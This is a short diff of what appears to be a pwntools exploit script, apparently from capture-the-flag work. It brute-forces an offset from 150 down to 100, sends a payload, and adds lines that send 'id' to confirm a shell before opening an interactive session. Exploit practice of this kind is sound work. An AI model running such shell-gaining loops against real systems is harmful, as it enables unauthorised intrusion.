@@ -31,6 +31,8 @@ for i in range(100, 150)[::-1]:
         success(i)
         io.sendlineafter("\n", payload)
         
+        io.sendline("id")
+        io.recv()
         io.interactive()
         #  io.close()
     except:
